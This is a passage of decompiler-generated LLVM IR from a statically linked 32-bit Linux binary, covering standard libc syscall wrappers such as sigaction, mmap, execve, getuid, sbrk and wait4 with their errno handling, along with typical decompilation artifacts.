  %v5_8054cff = icmp eq i8 %v4_8054cff, 0
  %v1_8054d06 = icmp eq i1 %v5_8054cff, false
  br i1 %v1_8054d06, label %dec_label_pc_8054d14, label %dec_label_pc_8054d08

dec_label_pc_8054d08:                             ; preds = %dec_label_pc_8054cc5
  br label %dec_label_pc_8054d14

dec_label_pc_8054d14:                             ; preds = %dec_label_pc_8054d08, %dec_label_pc_8054cc5, %entry
  %v1_8054d16 = icmp eq i32 %arg3, 0
  br i1 %v1_8054d16, label %dec_label_pc_8054d1e, label %dec_label_pc_8054d1a

dec_label_pc_8054d1a:                             ; preds = %dec_label_pc_8054d14
  %v2_8054d1a = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054d1e

dec_label_pc_8054d1e:                             ; preds = %dec_label_pc_8054d14, %dec_label_pc_8054d1a
  %v0_8054d2d = phi i32 [ 0, %dec_label_pc_8054d14 ], [ %v2_8054d1a, %dec_label_pc_8054d1a ]
  br i1 %v1_8054cc1, label %dec_label_pc_8054d2b, label %dec_label_pc_8054d24

dec_label_pc_8054d24:                             ; preds = %dec_label_pc_8054d1e
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8054d2b

dec_label_pc_8054d2b:                             ; preds = %dec_label_pc_8054d1e, %dec_label_pc_8054d24
  %v0_8054d2e = phi %sigaction* [ null, %dec_label_pc_8054d1e ], [ %phitmp, %dec_label_pc_8054d24 ]
  %v5_8054d36 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8054d2e, i32 %v0_8054d2d, i32 8)
  store i32 %v5_8054d36, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054d16, label %dec_label_pc_8054d79, label %dec_label_pc_8054d44

dec_label_pc_8054d44:                             ; preds = %dec_label_pc_8054d2b
  %v2_8054d44 = icmp slt i32 %v5_8054d36, 0
  br i1 %v2_8054d44, label %dec_label_pc_8054d79, label %dec_label_pc_8054d48

dec_label_pc_8054d48:                             ; preds = %dec_label_pc_8054d44
  %v3_8054d48 = load i32, i32* %stack_var_-288, align 4
  %v2_8054d4c = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054d48, i32* %v2_8054d4c, align 4
  %v2_8054d54 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054d59 = add i32 %arg3, 4
  %v3_8054d5d = inttoptr i32 %v1_8054d59 to i16*
  %v4_8054d5d = call i32 @memcpy(i16* %v3_8054d5d, i32 %v2_8054d54, i32 128)
  %v2_8054d66 = add i32 %arg3, 132
  %v3_8054d66 = inttoptr i32 %v2_8054d66 to i32*
  %v2_8054d73 = add i32 %arg3, 136
  %v3_8054d73 = inttoptr i32 %v2_8054d73 to i32*
  %v0_8054d79.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d79

dec_label_pc_8054d79:                             ; preds = %dec_label_pc_8054d44, %dec_label_pc_8054d2b, %dec_label_pc_8054d48
  %v0_8054d79 = phi i32 [ %v5_8054d36, %dec_label_pc_8054d44 ], [ %v5_8054d36, %dec_label_pc_8054d2b ], [ %v0_8054d79.pre, %dec_label_pc_8054d48 ]
  store i32 %v0_8054cac, i32* @ebx, align 4
  store i32 %v0_8054cab, i32* @esi, align 4
  ret i32 %v0_8054d79

; uselistorder directives
  uselistorder i32 %v5_8054d36, { 0, 1, 3, 2 }
  uselistorder i1 %v1_8054d16, { 1, 0 }
  uselistorder i1 %v1_8054cc1, { 1, 0 }
  uselistorder i32* null, { 2, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 18, 3, 4 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_8054d79, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054d2b, { 1, 0 }
  uselistorder label %dec_label_pc_8054d1e, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_8054d87 = load i32, i32* @eax, align 4
  %v1_8054d89 = sub i32 0, %v0_8054d87
  %v1_8054d8b = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_8054d90 = inttoptr i32 %v1_8054d8b to i32*
  store i32 %v1_8054d89, i32* %v2_8054d90, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_8054d9c = load i32, i32* @ebx, align 4
  %v2_8054da3 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8054da3, i32* @ebx, align 4
  %v8_8054da7 = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8054d9c, i32* @ebx, align 4
  %v3_8054db0 = icmp ugt i32 %v8_8054da7, -4096
  call void @__pseudo_cond_branch(i1 %v3_8054db0, i32 134565252)
  ret i32 %v8_8054da7

; uselistorder directives
  uselistorder i32 %v8_8054da7, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134565252, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054db8 = load i32, i32* @ebx, align 4
  store i32 %v0_8054db8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054dcb = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054dcb, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8054dcb, -4095
  br i1 %tmp8, label %dec_label_pc_8054de4, label %dec_label_pc_8054dd8

dec_label_pc_8054dd8:                             ; preds = %entry
  %v0_8054dd8 = load i32, i32* %stack_var_-4, align 4
  %v1_8054dd8 = call i32 @__errno_location(i32 %v0_8054dd8)
  %v0_8054ddd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054ddd = sub i32 0, %v0_8054ddd
  %v2_8054ddf = inttoptr i32 %v1_8054dd8 to i32*
  store i32 %v1_8054ddd, i32* %v2_8054ddf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054de4

dec_label_pc_8054de4:                             ; preds = %entry, %dec_label_pc_8054dd8
  %v0_8054de4 = phi i32 [ %v1_8054dcb, %entry ], [ -1, %dec_label_pc_8054dd8 ]
  %v2_8054de6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054de6, i32* @edx, align 4
  %v2_8054de8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054de8, i32* @ebx, align 4
  ret i32 %v0_8054de4

; uselistorder directives
  uselistorder i32 %v1_8054dcb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8054de4, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054ded = load i32, i32* @esi, align 4
  store i32 %v0_8054ded, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8054e01 = load i32, i32* @ebx, align 4
  %v7_8054e09 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054e09, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_8054e09, -4095
  br i1 %tmp13, label %dec_label_pc_8054e21, label %dec_label_pc_8054e15

dec_label_pc_8054e15:                             ; preds = %entry
  %v1_8054e15 = call i32 @__errno_location(i32 %v0_8054e01)
  %v0_8054e1a = load i32, i32* %esi.global-to-local, align 4
  %v1_8054e1a = sub i32 0, %v0_8054e1a
  %v2_8054e1c = inttoptr i32 %v1_8054e15 to i32*
  store i32 %v1_8054e1a, i32* %v2_8054e1c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054e21

dec_label_pc_8054e21:                             ; preds = %entry, %dec_label_pc_8054e15
  %v0_8054e21 = phi i32 [ %v7_8054e09, %entry ], [ -1, %dec_label_pc_8054e15 ]
  %v2_8054e23 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e23, i32* @edx, align 4
  %v2_8054e24 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054e24, i32* @esi, align 4
  ret i32 %v0_8054e21

; uselistorder directives
  uselistorder i32 %v7_8054e09, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054e21, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e28 = load i32, i32* @ebx, align 4
  store i32 %v0_8054e28, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8054e3b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8054e3b, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_8054e3b, -4095
  br i1 %tmp9, label %dec_label_pc_8054e54, label %dec_label_pc_8054e48

dec_label_pc_8054e48:                             ; preds = %entry
  %v0_8054e48 = load i32, i32* %stack_var_-4, align 4
  %v1_8054e48 = call i32 @__errno_location(i32 %v0_8054e48)
  %v0_8054e4d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054e4d = sub i32 0, %v0_8054e4d
  %v2_8054e4f = inttoptr i32 %v1_8054e48 to i32*
  store i32 %v1_8054e4d, i32* %v2_8054e4f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e54

dec_label_pc_8054e54:                             ; preds = %entry, %dec_label_pc_8054e48
  %v0_8054e54 = phi i32 [ %v4_8054e3b, %entry ], [ -1, %dec_label_pc_8054e48 ]
  %v2_8054e56 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e56, i32* @edx, align 4
  %v2_8054e58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054e58, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054e54

; uselistorder directives
  uselistorder i32 %v4_8054e3b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054e54, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e5c = load i32, i32* @edi, align 4
  store i32 %v0_8054e5c, i32* %stack_var_-4, align 4
  %v4_8054e60 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054e60, i32* %edi.global-to-local, align 4
  %v0_8054e6c = load i32, i32* @ebx, align 4
  %v5_8054e74 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8054e74 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8054e74 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8054e74, [1 x i8*] %v8_8054e74)
  store i32 %v9_8054e74, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8054e74, -4095
  br i1 %tmp12, label %dec_label_pc_8054e8c, label %dec_label_pc_8054e80

dec_label_pc_8054e80:                             ; preds = %entry
  %v1_8054e80 = call i32 @__errno_location(i32 %v0_8054e6c)
  %v0_8054e85 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054e85 = sub i32 0, %v0_8054e85
  %v2_8054e87 = inttoptr i32 %v1_8054e80 to i32*
  store i32 %v1_8054e85, i32* %v2_8054e87, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8054e8c

dec_label_pc_8054e8c:                             ; preds = %entry, %dec_label_pc_8054e80
  %v0_8054e8c = phi i32 [ %v9_8054e74, %entry ], [ -1, %dec_label_pc_8054e80 ]
  %v2_8054e8e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054e8e, i32* @edx, align 4
  %v2_8054e90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054e90, i32* %edi.global-to-local, align 4
  ret i32 %v0_8054e8c

; uselistorder directives
  uselistorder i32 %v9_8054e74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054e8c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054e94 = load i32, i32* @ebx, align 4
  store i32 %v0_8054e94, i32* %stack_var_-4, align 4
  %v1_8054e9d = call i32 @int80_syscall(i32 202)
  store i32 %v1_8054e9d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054e9d, -4095
  br i1 %tmp6, label %dec_label_pc_8054eb4, label %dec_label_pc_8054ea8

dec_label_pc_8054ea8:                             ; preds = %entry
  %v0_8054ea8 = load i32, i32* %stack_var_-4, align 4
  %v1_8054ea8 = call i32 @__errno_location(i32 %v0_8054ea8)
  %v0_8054ead = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054ead = sub i32 0, %v0_8054ead
  %v2_8054eaf = inttoptr i32 %v1_8054ea8 to i32*
  store i32 %v1_8054ead, i32* %v2_8054eaf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054eb4

dec_label_pc_8054eb4:                             ; preds = %entry, %dec_label_pc_8054ea8
  %v0_8054eb4 = phi i32 [ %v1_8054e9d, %entry ], [ -1, %dec_label_pc_8054ea8 ]
  %v2_8054eb8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054eb8, i32* @ebx, align 4
  ret i32 %v0_8054eb4

; uselistorder directives
  uselistorder i32 %v1_8054e9d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 202, { 1, 0 }
  uselistorder label %dec_label_pc_8054eb4, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054ebc = load i32, i32* @ebx, align 4
  store i32 %v0_8054ebc, i32* %stack_var_-4, align 4
  %v1_8054ec5 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8054ec5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054ec5, -4095
  br i1 %tmp6, label %dec_label_pc_8054edc, label %dec_label_pc_8054ed0

dec_label_pc_8054ed0:                             ; preds = %entry
  %v0_8054ed0 = load i32, i32* %stack_var_-4, align 4
  %v1_8054ed0 = call i32 @__errno_location(i32 %v0_8054ed0)
  %v0_8054ed5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054ed5 = sub i32 0, %v0_8054ed5
  %v2_8054ed7 = inttoptr i32 %v1_8054ed0 to i32*
  store i32 %v1_8054ed5, i32* %v2_8054ed7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054edc

dec_label_pc_8054edc:                             ; preds = %entry, %dec_label_pc_8054ed0
  %v0_8054edc = phi i32 [ %v1_8054ec5, %entry ], [ -1, %dec_label_pc_8054ed0 ]
  %v2_8054ee0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054ee0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054edc

; uselistorder directives
  uselistorder i32 %v1_8054ec5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054edc, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_8054ee4 = load i32, i32* @global_var_80636d0.565, align 16
  %v1_8054eee = icmp eq i32 %v0_8054ee4, 0
  br i1 %v1_8054eee, label %dec_label_pc_8054ef4, label %dec_label_pc_8054ef2

dec_label_pc_8054ef2:                             ; preds = %entry
  br label %dec_label_pc_8054ef4

dec_label_pc_8054ef4:                             ; preds = %entry, %dec_label_pc_8054ef2
  %storemerge = phi i32 [ %v0_8054ee4, %dec_label_pc_8054ef2 ], [ 4096, %entry ]
  %v0_8054ef4 = phi i32 [ %v0_8054ee4, %dec_label_pc_8054ef2 ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_8054ef4

; uselistorder directives
  uselistorder label %dec_label_pc_8054ef4, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054ef8 = load i32, i32* @ebx, align 4
  store i32 %v0_8054ef8, i32* %stack_var_-4, align 4
  %v1_8054f01 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8054f01, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054f01, -4095
  br i1 %tmp6, label %dec_label_pc_8054f18, label %dec_label_pc_8054f0c

dec_label_pc_8054f0c:                             ; preds = %entry
  %v0_8054f0c = load i32, i32* %stack_var_-4, align 4
  %v1_8054f0c = call i32 @__errno_location(i32 %v0_8054f0c)
  %v0_8054f11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054f11 = sub i32 0, %v0_8054f11
  %v2_8054f13 = inttoptr i32 %v1_8054f0c to i32*
  store i32 %v1_8054f11, i32* %v2_8054f13, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f18

dec_label_pc_8054f18:                             ; preds = %entry, %dec_label_pc_8054f0c
  %v0_8054f18 = phi i32 [ %v1_8054f01, %entry ], [ -1, %dec_label_pc_8054f0c ]
  %v2_8054f1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054f1c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054f18

; uselistorder directives
  uselistorder i32 %v1_8054f01, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_8054f18, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054f20 = load i32, i32* @ebx, align 4
  store i32 %v0_8054f20, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054f33 = call i32 @munmap(i32 %v0_8054f20, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8054f33, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8054f33, -4095
  br i1 %tmp8, label %dec_label_pc_8054f4c, label %dec_label_pc_8054f40

dec_label_pc_8054f40:                             ; preds = %entry
  %v0_8054f40 = load i32, i32* %stack_var_-4, align 4
  %v1_8054f40 = call i32 @__errno_location(i32 %v0_8054f40)
  %v0_8054f45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054f45 = sub i32 0, %v0_8054f45
  %v2_8054f47 = inttoptr i32 %v1_8054f40 to i32*
  store i32 %v1_8054f45, i32* %v2_8054f47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f4c

dec_label_pc_8054f4c:                             ; preds = %entry, %dec_label_pc_8054f40
  %v0_8054f4c = phi i32 [ %v4_8054f33, %entry ], [ -1, %dec_label_pc_8054f40 ]
  %v2_8054f4e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054f4e, i32* @edx, align 4
  %v2_8054f50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054f50, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054f4c

; uselistorder directives
  uselistorder i32 %v4_8054f33, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054f4c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054f54 = load i32, i32* @ebx, align 4
  store i32 %v0_8054f54, i32* %stack_var_-4, align 4
  %v4_8054f58 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8054f58, i32* %ebx.global-to-local, align 4
  %v6_8054f67 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8054f67, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8054f67, -4095
  br i1 %tmp10, label %dec_label_pc_8054f80, label %dec_label_pc_8054f74

dec_label_pc_8054f74:                             ; preds = %entry
  %v0_8054f74 = load i32, i32* %stack_var_-4, align 4
  %v1_8054f74 = call i32 @__errno_location(i32 %v0_8054f74)
  %v0_8054f79 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054f79 = sub i32 0, %v0_8054f79
  %v2_8054f7b = inttoptr i32 %v1_8054f74 to i32*
  store i32 %v1_8054f79, i32* %v2_8054f7b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054f80

dec_label_pc_8054f80:                             ; preds = %entry, %dec_label_pc_8054f74
  %v0_8054f80 = phi i32 [ %v6_8054f67, %entry ], [ -1, %dec_label_pc_8054f74 ]
  %v2_8054f82 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054f82, i32* @edx, align 4
  %v2_8054f84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054f84, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054f80

; uselistorder directives
  uselistorder i32 %v6_8054f67, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054f80, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8054f89 = load i32, i32* @ebx, align 4
  %v0_8054f8d = load i32, i32* @global_var_8063704.570, align 4
  %v1_8054f8d = icmp eq i32 %v0_8054f8d, 0
  %v1_8054f98 = icmp eq i1 %v1_8054f8d, false
  br i1 %v1_8054f98, label %dec_label_pc_8054fab, label %dec_label_pc_8054f9a

dec_label_pc_8054f9a:                             ; preds = %entry
  %v1_8054f9f = call i32 @__GI_brk(i32 0)
  %v2_8054fa7 = icmp slt i32 %v1_8054f9f, 0
  br i1 %v2_8054fa7, label %dec_label_pc_8054fcd, label %dec_label_pc_8054f9a.dec_label_pc_8054fab_crit_edge

dec_label_pc_8054f9a.dec_label_pc_8054fab_crit_edge: ; preds = %dec_label_pc_8054f9a
  %v0_8054fad.pre = load i32, i32* @global_var_8063704.570, align 4
  br label %dec_label_pc_8054fab

dec_label_pc_8054fab:                             ; preds = %dec_label_pc_8054f9a.dec_label_pc_8054fab_crit_edge, %entry
  %v0_8054fbb = phi i32 [ %v0_8054fad.pre, %dec_label_pc_8054f9a.dec_label_pc_8054fab_crit_edge ], [ %v0_8054f8d, %entry ]
  %v1_8054fab = icmp eq i32 %arg1, 0
  %v1_8054fb2 = icmp eq i1 %v1_8054fab, false
  br i1 %v1_8054fb2, label %dec_label_pc_8054fb8, label %dec_label_pc_8054fb4

dec_label_pc_8054fb4:                             ; preds = %dec_label_pc_8054fab
  br label %dec_label_pc_8054fd0

dec_label_pc_8054fb8:                             ; preds = %dec_label_pc_8054fab
  store i32 %v0_8054fbb, i32* @ebx, align 4
  %v2_8054fbd = add i32 %v0_8054fbb, %arg1
  %v1_8054fc1 = call i32 @__GI_brk(i32 %v2_8054fbd)
  %v2_8054fc9 = icmp slt i32 %v1_8054fc1, 0
  %v1_8054fcb = icmp eq i1 %v2_8054fc9, false
  br i1 %v1_8054fcb, label %dec_label_pc_8054fb8.dec_label_pc_8054fd0_crit_edge, label %dec_label_pc_8054fcd

dec_label_pc_8054fb8.dec_label_pc_8054fd0_crit_edge: ; preds = %dec_label_pc_8054fb8
  %v0_8054fd0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054fd0

dec_label_pc_8054fcd:                             ; preds = %dec_label_pc_8054fb8, %dec_label_pc_8054f9a
  br label %dec_label_pc_8054fd0

dec_label_pc_8054fd0:                             ; preds = %dec_label_pc_8054fb8.dec_label_pc_8054fd0_crit_edge, %dec_label_pc_8054fb4, %dec_label_pc_8054fcd
  %v0_8054fd0 = phi i32 [ %v0_8054fd0.pre, %dec_label_pc_8054fb8.dec_label_pc_8054fd0_crit_edge ], [ %v0_8054fbb, %dec_label_pc_8054fb4 ], [ -1, %dec_label_pc_8054fcd ]
  %v2_8054fd2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054fd2, i32* @edx, align 4
  store i32 %v0_8054f89, i32* @ebx, align 4
  ret i32 %v0_8054fd0

; uselistorder directives
  uselistorder i32 %v0_8054fbb, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8054fd0, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054fd8 = load i32, i32* @edi, align 4
  %v0_8054fd9 = load i32, i32* @esi, align 4
  store i32 %v0_8054fd9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8054fed = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054ff5 = call i32 @wait4(i32 %v0_8054fed, i32 %v0_8054fd9, i32 %v0_8054fd8, i32 %tmp5)
  store i32 %v0_8054fed, i32* @ebx, align 4
  store i32 %v4_8054ff5, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8054ff5, -4095
  br i1 %tmp10, label %dec_label_pc_805500d, label %dec_label_pc_8055001

dec_label_pc_8055001:                             ; preds = %entry
  %v1_8055001 = call i32 @__errno_location(i32 %v0_8054fed)
  %v0_8055006 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055006 = sub i32 0, %v0_8055006
  %v2_8055008 = inttoptr i32 %v1_8055001 to i32*
  store i32 %v1_8055006, i32* %v2_8055008, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805500d

dec_label_pc_805500d:                             ; preds = %entry, %dec_label_pc_8055001
  %v0_805500d = phi i32 [ %v4_8054ff5, %entry ], [ -1, %dec_label_pc_8055001 ]
  %v2_805500f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805500f, i32* @edx, align 4
  %v2_8055010 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055010, i32* @esi, align 4
  store i32 %v0_8054fd8, i32* @edi, align 4
  ret i32 %v0_805500d

; uselistorder directives
  uselistorder i32 %v4_8054ff5, { 1, 0, 2 }
  uselistorder i32 %v0_8054fed, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805500d, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80636e4.571 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8055027 = icmp eq i32 %tmp5, 0
  %v1_8055029 = icmp eq i1 %v1_8055027, false
  br i1 %v1_8055029, label %dec_label_pc_8055031, label %dec_label_pc_805502b

dec_label_pc_805502b:                             ; preds = %entry
  %v2_805502b = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8055031

dec_label_pc_8055031:                             ; preds = %entry, %dec_label_pc_805502b
  %v0_805504d = phi i32 [ %tmp5, %entry ], [ %v2_805502b, %dec_label_pc_805502b ]
  %v0_8055035 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_805502b ]
  %v2_8055031 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8055035, i32* %stack_var_-4, align 4
  store i32 %v2_8055031, i32* %stack_var_-8, align 4
  %v2_8055048 = ptrtoint i32* %stack_var_-8 to i32
